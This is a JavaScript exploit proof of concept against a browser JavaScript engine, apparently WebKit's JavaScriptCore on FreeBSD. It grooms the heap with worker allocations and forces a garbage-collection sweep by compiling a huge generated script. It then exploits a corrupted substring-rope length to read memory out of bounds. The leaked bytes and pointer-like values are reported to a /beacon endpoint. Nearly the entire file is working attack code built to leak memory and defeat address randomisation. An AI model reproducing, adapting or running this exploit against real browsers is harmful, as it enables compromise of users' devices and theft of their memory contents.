// p389 - SUBSTRING ROPE OOB READ via CompactFibers::m_length corruption
//
// SOL FINDING: For substring ropes, charCodeAt creates StringView with:
//   pointer = base.characters8() + substringOffset()
//   length  = CompactFibers::m_length (cell offset 16, IN MARKEDSPACE)
// NO comparison against base string's actual length!
//
// If sweep corrupts CompactFibers::m_length to V > base_length,
// charCodeAt(base_length..V-1) reads OOB past base's buffer.
//
// STRATEGY:
// 1. Worker allocates 20 large bait strings (100000 chars) - pushes MarkedSpace high
// 2. Worker allocates 10 small base strings (200 chars each, in IsoHeap)
// 3. Worker creates 10 substring ropes: base.substring(0, 100) - DO NOT RESOLVE
// 4. Free baits -> GC -> compile (sweep through MarkedSpace)
// 5. Check rope .length - if corrupted > 200, try charCodeAt OOB from base
//
// KEY: substring ropes MUST NOT be resolved (no charCodeAt/toString before sweep)
// After sweep: .length reads CompactFibers::m_length (corrupted cell offset 16)
//
// Beacon prefix: V389-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V389-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V389-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var bases = [];
    var ropes = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V389-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function makeStr(len, ch) {
      var s = '';
      for (var i = 0; i < 100; i++) s += ch;
      var reps = Math.ceil(len / 100);
      var result = '';
      for (var i = 0; i < reps; i++) result += s;
      result = result.substring(0, len);
      result.charCodeAt(0); // resolve to flat
      return result;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // Step 1: 20 large baits to push MarkedSpace high
        for (var i = 0; i < 20; i++) {
          baits.push(makeStr(100000, 'B'));
        }
        beacon('BAITS-' + baits.length);

        // Step 2: 10 small base strings (200 chars, resolved)
        for (var i = 0; i < 10; i++) {
          bases.push(makeStr(200, 'A'));
        }
        beacon('BASES-' + bases.length);

        // Step 3: 10 substring ropes from bases - DO NOT RESOLVE
        // substring() creates JSRopeString with isSubstring flag
        // CompactFibers::m_length = 100 at cell offset 16
        for (var i = 0; i < bases.length; i++) {
          ropes.push(bases[i].substring(0, 100));
        }
        beacon('ROPES-' + ropes.length);

        // Step 4: Free baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = [];
        beacon('FREED');

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var lenCorrupt = 0;
        var oobCount = 0;
        var crashCount = 0;
        var intactCount = 0;

        for (var i = 0; i < ropes.length; i++) {
          try {
            var r = ropes[i];
            var len;
            try {
              len = r.length;
            } catch(e2) {
              crashCount++;
              beacon('R' + i + '-LENCRASH');
              continue;
            }

            if (len === 100) {
              intactCount++;
              continue;
            }

            lenCorrupt++;
            beacon('R' + i + '-LEN-' + len);

            // Report length as hex
            var lenU = len >>> 0;
            beacon('R' + i + '-LENHEX-' + hexByte((lenU>>24)&0xFF) + hexByte((lenU>>16)&0xFF) + hexByte((lenU>>8)&0xFF) + hexByte(lenU&0xFF));

            if (len > 200) {
              // OOB window: len - 200 bytes past the 200-byte base buffer
              oobCount++;
              beacon('R' + i + '-OOB-WINDOW-' + (len - 200));

              // Read OOB data starting at index 200 (past base buffer)
              // Read in chunks, hex-encode non-zero bytes
              var maxRead = Math.min(len, 200 + 512);
              var hex = '';
              var nullRun = 0;
              var readFail = 0;
              for (var j = 200; j < maxRead; j++) {
                try {
                  var c = r.charCodeAt(j);
                  if (c !== c) { readFail++; break; }
                  if (c === 0) {
                    nullRun++;
                  } else {
                    if (nullRun > 0 && hex.length > 0) {
                      hex += '(0x' + nullRun + ')';
                      nullRun = 0;
                    }
                    hex += hexByte(c & 0xFF);
                    if (c > 0xFF) hex += hexByte((c >> 8) & 0xFF);
                  }
                } catch(e3) {
                  readFail++;
                  hex += 'EE';
                  break;
                }
              }
              if (hex.length > 0) {
                beacon('R' + i + '-LEAK-' + hex.substring(0, 60));
                if (hex.length > 60) beacon('R' + i + '-LEAK2-' + hex.substring(60, 120));
                if (hex.length > 120) beacon('R' + i + '-LEAK3-' + hex.substring(120, 180));
              }
              beacon('R' + i + '-NULLS-' + nullRun + '-FAIL-' + readFail);

              // Scan for pointer-like patterns in the OOB window
              // Read 8 bytes at a time starting from offset 200
              var ptrCount = 0;
              for (var j = 200; j < Math.min(len, 200 + 256) - 7; j += 8) {
                try {
                  var lo = r.charCodeAt(j) | (r.charCodeAt(j+1) << 8) |
                           (r.charCodeAt(j+2) << 16) | (r.charCodeAt(j+3) << 24);
                  var hi = r.charCodeAt(j+4) | (r.charCodeAt(j+5) << 8) |
                           (r.charCodeAt(j+6) << 16) | (r.charCodeAt(j+7) << 24);
                  // Check for userspace pointer patterns (FreeBSD AMD64)
                  // Code: 0x00000002xxxxxxxx or similar low range
                  // Heap: varies, but high bytes should be small
                  var hiU = hi >>> 0;
                  if (hiU > 0 && hiU < 0x800) {
                    ptrCount++;
                    if (ptrCount <= 5) {
                      beacon('R' + i + '-PTR-' + j + '-' +
                        hexByte((hiU>>24)&0xFF) + hexByte((hiU>>16)&0xFF) +
                        hexByte((hiU>>8)&0xFF) + hexByte(hiU&0xFF) +
                        hexByte((lo>>>24)&0xFF) + hexByte((lo>>>16)&0xFF) +
                        hexByte((lo>>>8)&0xFF) + hexByte(lo&0xFF));
                    }
                  }
                } catch(e3) { break; }
              }
              if (ptrCount > 0) beacon('R' + i + '-PTRS-' + ptrCount);

            } else if (len > 0 && len < 100) {
              // Length shrunk -- bytecodeIndex or bit field write
              beacon('R' + i + '-SHRUNK-' + len);
            }

          } catch(ex) {
            crashCount++;
            if (crashCount <= 10) {
              beacon('R' + i + '-CRASH-' + (ex.message || '').substring(0, 30));
            }
          }
        }

        // Also check if base strings are still intact
        var basesOk = 0;
        for (var i = 0; i < bases.length; i++) {
          try {
            if (bases[i].length === 200 && bases[i].charCodeAt(0) === 0x41) basesOk++;
          } catch(e2) {}
        }

        beacon('SUMMARY-CORRUPT' + lenCorrupt + '-OOB' + oobCount + '-INTACT' + intactCount + '-CRASH' + crashCount + '-BASES' + basesOk);
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p389fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p389ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p389ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
